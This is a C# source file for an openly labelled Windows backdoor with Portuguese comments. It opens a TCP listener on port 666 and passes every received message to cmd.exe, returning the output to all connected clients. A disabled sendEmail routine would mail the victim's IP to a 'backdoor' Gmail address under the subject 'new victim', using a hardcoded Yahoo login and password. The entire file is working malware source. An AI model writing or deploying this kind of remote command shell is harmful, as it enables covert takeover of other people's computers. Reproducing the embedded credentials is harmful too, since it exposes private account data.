using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;

namespace Socket
{
    class Server
    {
        List<TcpClient> clientes = new List<TcpClient>();
        Process processo;

        static void Main(string[] args)
        {
            Server self = new Server();
            self.processo = new Process();

            String ip = self.getPublicIP();

            TcpListener server = new TcpListener(IPAddress.Parse(ip), 666);

            //self.sendEmail(ip.ToString());

            server.Start();
            Console.WriteLine("Server up no endereço 127.0.0.1:666. Esperando uma conexão...");
            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                Console.WriteLine("Alguém se conectou.");
                self.clientes.Add(client);
                self.messageListener(client.GetStream(), client);
            }
           
        }

        public void sendToAll(byte[] msg)
        {
            foreach(TcpClient cliente in this.clientes)
            {
                cliente.GetStream().Write(msg, 0, msg.Length);
                cliente.GetStream().Flush();
            }
        }

        public void messageListener(NetworkStream stream, TcpClient client)
        {
            new Thread(() =>
            {
                while (true)
                {
                    while (!stream.DataAvailable) ;
                    Byte[] bytes = new Byte[client.Available];
                    stream.Read(bytes, 0, bytes.Length);
                    String msg = Encoding.UTF8.GetString(bytes);
                    String result = ExecutarCMD(msg);

                    byte[] saida = Encoding.ASCII.GetBytes(result);
                    sendToAll(saida);
                }
            }).Start();
        }

        public string ExecutarCMD(string comando)
        {   
            try
            { 
                processo.StartInfo.FileName = Environment.GetEnvironmentVariable("comspec");

                // Formata a string para passar como argumento para o cmd.exe
                processo.StartInfo.Arguments = string.Format("/c {0}", comando);

                processo.StartInfo.RedirectStandardOutput = true;
                processo.StartInfo.RedirectStandardError = true;
                processo.StartInfo.UseShellExecute = false;
                processo.StartInfo.WorkingDirectory = @"c:\";
                //processo.StartInfo.CreateNoWindow = true;


                processo.Start();
                processo.WaitForExit();

                string saida = processo.StandardOutput.ReadToEnd();
                string stderrx = processo.StandardError.ReadToEnd();
                
                if(stderrx.Equals("") || stderrx.Length == 0)
                {
                    return saida;
                }else
                {
                    return stderrx;
                }
            }catch(Exception e)
            {
                return e.Message;
            }
        }

        public void sendEmail(String ip)
        {
            string smtpAddress = "smtp.mail.yahoo.com";

            string emailFrom = "skyvini@yahoo.com.br";
            string password = "759135153759";
            string emailTo = "teste.backdoor@gmail.com";
            string subject = "Nova vítima";
            string body = ip;

            SmtpClient theClient = new SmtpClient("smtp.mail.yahoo.com", 465);
            theClient.UseDefaultCredentials = false;
            theClient.Credentials = new NetworkCredential(emailFrom, password);
            theClient.EnableSsl = true;

            MailMessage theMessage = new MailMessage(emailFrom,
                                                     emailTo);

            theMessage.Subject = subject;
            theMessage.Body = body;

            theClient.Send(theMessage);
        }

        public String getPublicIP()
        {
            IPHostEntry IPHost = Dns.GetHostEntry(Dns.GetHostName());
            string externalIP = IPHost.AddressList[IPHost.AddressList.Length - 1].ToString();
            return externalIP;
        }

    }

}
